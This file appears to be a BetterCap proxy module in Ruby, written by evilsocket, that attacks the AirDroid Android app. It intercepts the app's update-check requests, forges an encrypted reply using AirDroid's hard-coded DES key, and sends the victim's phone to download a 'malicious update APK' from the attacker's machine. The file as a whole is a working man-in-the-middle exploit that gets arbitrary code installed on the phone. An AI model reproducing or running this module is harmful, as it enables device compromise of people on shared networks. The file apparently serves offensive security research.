=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

require 'json'
require 'openssl'

class AirDroid < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'AirDroid',
    'Description' => 'Force AirDroid to install a malicious update APK.',
    'Version'     => '1.0.0',
    'Author'      => "Simone 'evilsocket' Margaritelli",
    'License'     => 'GPL3'
  )

  def initialize
    raise BetterCap::Error, "An update.apk file is needed." unless File.file?('update.apk')
    raise BetterCap::Error, "A changelog.html file is needed." unless File.file?('changelog.html')

    BetterCap::Logger.info "[#{'AIRDROID'.red}] Remember to enable the --httpd option."
  end

  def on_request( request, response )
    if request.host.include?('airdroid.com') and request.path =~ /.*\/phone\/vncupgrade\/\?q=([A-F0-9]+)&ver=(.+)$/
      BetterCap::Logger.info "[#{'AIRDROID'.red} (v#{$2})] Detected update request, sending spoofed reply ..."

      reply = {
        "code": 1,
        "msg": "new update available",
        "data": {
          "update_from_url": true,
          "url_download": "http://#{BetterCap::Context.get().iface.ip}:8081/update.apk",
          "url_updatelog": "http://#{BetterCap::Context.get().iface.ip}:8081/changelog.html",
          "version": 66666666,
          "addon_package_name": "foo.bar"
        }
      }

      response.body = airdroid_encrypt( reply.to_json )

    end
  end

  private

  def airdroid_decrypt( s, key = '890jklms' )
    cipher = OpenSSL::Cipher::Cipher.new('des-ecb')
    cipher.decrypt
    cipher.key = key
    plain = cipher.update( [s].pack('H*'))
    plain << cipher.final
    plain
  end

  def airdroid_encrypt( s, key = '890jklms' )
    cipher = OpenSSL::Cipher::Cipher.new('des-ecb')
    cipher.encrypt
    cipher.key = key
    enc = cipher.update(s)
    enc << cipher.final
    enc.each_byte.map { |b| "%02x" % b }.join.upcase
  end
end
